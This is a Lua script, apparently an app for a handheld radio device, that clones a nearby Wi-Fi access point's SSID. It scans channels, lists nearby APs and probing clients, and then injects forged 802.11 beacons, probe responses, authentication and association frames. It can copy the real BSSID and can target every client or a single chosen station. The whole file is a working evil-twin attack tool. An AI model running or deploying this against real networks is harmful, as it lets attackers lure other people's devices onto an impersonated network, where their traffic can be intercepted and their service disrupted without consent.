-- AP cloner (ACTIVE, transmits). Clones a visible AP's SSID with raw 802.11 frames.
-- Targets: ALL clients, or ONE client (only that station gets probe responses, auth and assoc).
-- Beacons: on (broadcast presence) or off (quiet: answer only). BSSID: clone the real one or random.
-- Responds to probe requests, open-system auth (seq 1) and association requests. Nothing is stored.

local BEACON_MS = 102
local MAX_APS = 30
local MAX_STA = 60
local CHANS = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
local DWELL_MS = 800
local BCAST = string.rep("\255", 6)
local RATES = "\1\4\130\132\139\150"
local LH = 26

local W, H = 0, 0
local aps, ap_list = {}, {}
local probers = {}         -- probers[ssid] = { mac, ... } (probe requests seen)
local ci, last_hop = 1, 0

local function clip(s, n) return #s > n and s:sub(1, n) or s end
local function mac(b) return string.format("%02x:%02x:%02x:%02x:%02x:%02x", b:byte(1, 6)) end
local function header(t) gfx.rect(0, 0, W, 40, true); gfx.text(14, 10, t, "ui12", "bw") end

local function screen(title, lines, footer)
  gfx.clear(); W, H = gfx.size()
  header(title)
  local y = 56
  for _, l in ipairs(lines) do gfx.text(16, y, l, "ui12"); y = y + LH + 4 end
  gfx.text(14, H - 34, footer, "small")
  gfx.present()
end

-- first SSID tag at or after 1-based index i (wildcard = "")
local function ssid_from(frame, i)
  while i + 1 <= #frame do
    local tag, len = frame:byte(i), frame:byte(i + 1)
    if tag == 0 then return frame:sub(i + 2, i + 1 + len) end
    i = i + 2 + len
  end
  return nil
end

-- ---------- scan ----------
local function on_beacon(frame, ch, rssi)
  if #frame < 37 then return end
  local bssid = frame:sub(17, 22)
  local ssid = ssid_from(frame, 37) or ""
  if not ssid:match("^[%g ]*$") then ssid = "" end
  local a = aps[bssid]
  if not a then
    if #ap_list >= MAX_APS then return end
    a = { bssid = bssid, ssid = ssid, ch = ch, rssi = rssi or -99 }
    aps[bssid] = a
    ap_list[#ap_list + 1] = a
  else
    if ssid ~= "" then a.ssid = ssid end
    a.ch = ch
    if rssi then a.rssi = rssi end
  end
end

local function on_probe(frame)
  local ssid = ssid_from(frame, 25)
  if not ssid or ssid == "" or not ssid:match("^[%g ]+$") then return end
  local sta = frame:sub(11, 16)
  local list = probers[ssid]
  if not list then list = {}; probers[ssid] = list end
  for _, m in ipairs(list) do if m == sta then return end end
  if #list < MAX_STA then list[#list + 1] = sta end
end

local function scan()
  local ok, err = wifi.monitor_start({ channel = CHANS[ci] })
  if not ok then return nil, err end
  last_hop = system.millis()
  while true do
    local frame, meta = wifi.monitor_recv()
    while frame do
      local ch = (meta and meta.channel) or CHANS[ci]
      if #frame >= 24 and (frame:byte(1) & 0x0C) == 0 then
        local st = (frame:byte(1) >> 4) & 15
        if st == 8 then on_beacon(frame, ch, meta and meta.rssi)
        elseif st == 4 then on_probe(frame) end
      end
      frame, meta = wifi.monitor_recv()
    end
    if system.millis() - last_hop >= DWELL_MS then
      ci = ci % #CHANS + 1
      wifi.monitor_channel(CHANS[ci])
      last_hop = system.millis()
    end
    screen("Scanning 2.4 GHz", { #ap_list .. " APs heard", "channel " .. CHANS[ci] }, "Confirm = pick AP, Back = quit")
    local e = input.poll()
    if e == "back" then wifi.monitor_stop(); return nil end
    if e == "confirm" and #ap_list > 0 then break end
    app.sleep(20)
  end
  wifi.monitor_stop()
  return true
end

-- ---------- pickers ----------
local function menu(title, items, label_fn, footer)
  local cur = 1
  while true do
    gfx.clear(); W, H = gfx.size(); header(title)
    local y = 56
    for i, it in ipairs(items) do
      if y > H - 70 then break end
      local label = label_fn(it)
      if i == cur then gfx.rect(10, y - 4, W - 20, LH + 4, true); gfx.text(16, y, label, "small", "w")
      else gfx.text(16, y, label, "small") end
      y = y + LH
    end
    gfx.text(14, H - 34, footer, "small")
    gfx.present()
    local e = input.wait()
    if e == "up" then cur = cur > 1 and cur - 1 or #items
    elseif e == "down" then cur = cur < #items and cur + 1 or 1
    elseif e == "confirm" and #items > 0 then return items[cur]
    elseif e == "back" then return nil end
  end
end

local function pick_ap()
  return menu("Pick AP to clone", ap_list, function(a)
    return string.format("%-16s ch%-2d %4d", clip(a.ssid ~= "" and a.ssid or "<hidden>", 16), a.ch, a.rssi)
  end, "Up/Down, Confirm select, Back cancel")
end

local function pick_target(ap)
  local items = { { broadcast = true } }
  for _, m in ipairs(probers[ap.ssid] or {}) do items[#items + 1] = { sta = m } end
  return menu("Target: " .. clip(ap.ssid, 20), items, function(it)
    if it.broadcast then return "ALL clients" end
    return "client " .. mac(it.sta)
  end, "Up/Down, Confirm, Back cancel")
end

local function pick_option(title, opts)
  return menu(title, opts, function(o) return o.label end, "Confirm, Back cancel")
end

-- ---------- frame builders ----------
local function hdr(fc, dst, src, bssid)
  return string.char(fc, 0) .. "\0\0" .. dst .. src .. bssid .. "\0\0"
end
local function ssid_tag(s) return string.char(0, #s) .. s end
local function ds_tag(ch) return "\3\1" .. string.char(ch) end
local TS = string.rep("\0", 8)

local function beacon_frame(ssid, bssid, ch)
  return hdr(0x80, BCAST, bssid, bssid) .. TS .. "\100\0" .. "\1\0"
    .. ssid_tag(ssid) .. RATES .. ds_tag(ch)
end
local function probe_resp(ssid, bssid, ch, sta)
  return hdr(0x50, sta, bssid, bssid) .. TS .. "\100\0" .. "\1\0"
    .. ssid_tag(ssid) .. RATES .. ds_tag(ch)
end
local function auth_resp(sta, bssid)
  return hdr(0xB0, sta, bssid, bssid) .. "\0\0\2\0\0\0"          -- algo open, seq 2, status 0
end
local function assoc_resp(sta, bssid)
  return hdr(0x10, sta, bssid, bssid) .. "\1\0\0\0\1\192" .. RATES  -- cap, status 0, AID 1
end

local function random_bssid()
  local b = {}
  for i = 1, 6 do b[i] = math.random(0, 255) end
  b[1] = (b[1] & 0xFE) | 0x02                    -- locally administered, unicast
  return string.char(table.unpack(b))
end

-- ---------- run ----------
local function run(ap, target, beacons_on, bssid, title_note)
  local ssid = ap.ssid
  if ssid == "" then screen("AP cloner", { "Target AP has a hidden SSID.", "Pick a visible AP." }, "Back to exit")
    while input.wait() ~= "back" do end return end
  local ok, err = wifi.tx_start({ channel = ap.ch })
  if not ok then screen("AP cloner", { "Could not start transmit:", clip(tostring(err), 50) }, "Back to exit")
    while input.wait() ~= "back" do end return end
  local mon_ok = wifi.monitor_start({ channel = ap.ch })   -- sniffer + injector share the channel
  local beacon = beacon_frame(ssid, bssid, ap.ch)
  local joined, answered = {}, { probe = 0, auth = 0, assoc = 0 }
  local last_beacon, last_draw = -1000, -1000

  local function wanted(sta)
    return target.broadcast or sta == target.sta
  end

  while true do
    local now = system.millis()
    if beacons_on and now - last_beacon >= BEACON_MS then
      wifi.tx(beacon); last_beacon = now
    end
    if mon_ok then
      local frame = wifi.monitor_recv()
      while frame do
        if #frame >= 25 and (frame:byte(1) & 0x0C) == 0 then
          local st = (frame:byte(1) >> 4) & 15
          local sta = frame:sub(11, 16)
          if st == 4 then                                   -- probe request
            local want = ssid_from(frame, 25)
            if wanted(sta) and want and (want == "" or want == ssid) then
              wifi.tx(probe_resp(ssid, bssid, ap.ch, sta)); answered.probe = answered.probe + 1
            end
          elseif st == 11 and wanted(sta) and #frame >= 29 then   -- auth
            local seq = frame:byte(27) | (frame:byte(28) << 8)
            if seq == 1 then wifi.tx(auth_resp(sta, bssid)); answered.auth = answered.auth + 1 end
          elseif st == 0 and wanted(sta) then                -- association request
            wifi.tx(assoc_resp(sta, bssid)); answered.assoc = answered.assoc + 1
            if not joined[mac(sta)] then joined[mac(sta)] = true end
          end
        end
        frame = wifi.monitor_recv()
      end
    end
    if now - last_draw >= 1000 then
      local nj = 0; for _ in pairs(joined) do nj = nj + 1 end
      screen("Cloning " .. clip(ssid, 16) .. (title_note or ""), {
        "ch " .. ap.ch .. "  beacons " .. (beacons_on and "on" or "off"),
        "target " .. (target.broadcast and "ALL" or mac(target.sta)),
        "bssid " .. mac(bssid),
        string.format("probes %d  auth %d  assoc %d", answered.probe, answered.auth, answered.assoc),
        "associated: " .. nj,
      }, "Back = stop")
      last_draw = now
    end
    if input.poll() == "back" then break end
    app.sleep(10)
  end
  if mon_ok then wifi.monitor_stop() end
  wifi.tx_stop()
  screen("Stopped", { "Clone off, radio released." }, "Back to exit")
  while input.wait() ~= "back" do end
end

local function main()
  W, H = gfx.size()
  math.randomseed(system.millis())
  screen("AP cloner (ACTIVE)", {
    "Transmits fake 802.11 frames until Back.",
    "Clones a visible AP's SSID.",
    "Confirm to scan.",
  }, "Confirm = start, Back = quit")
  if input.wait() ~= "confirm" then return end
  if not scan() then return end
  local ap = pick_ap()
  if not ap then return end
  local target = pick_target(ap)
  if not target then return end
  local beacons = pick_option("Beacons", {
    { label = "Beacons ON (broadcast the SSID)", on = true },
    { label = "Beacons OFF (answer only)", on = false },
  })
  if not beacons then return end
  local bssidopt = pick_option("BSSID", {
    { label = "Clone real BSSID " .. mac(ap.bssid), bssid = ap.bssid },
    { label = "Random BSSID", bssid = random_bssid() },
  })
  if not bssidopt then return end
  run(ap, target, beacons.on, bssidopt.bssid)
end

local ok, err = pcall(main)
if not ok then
  pcall(function() wifi.tx_stop() end)
  pcall(function() wifi.monitor_stop() end)
  gfx.clear()
  gfx.text(10, 10, "err: " .. tostring(err):sub(1, 60), "ui12", "b")
  gfx.present()
  while input.wait() ~= "back" do end
end
pcall(function() wifi.tx_stop() end)
app.exit()
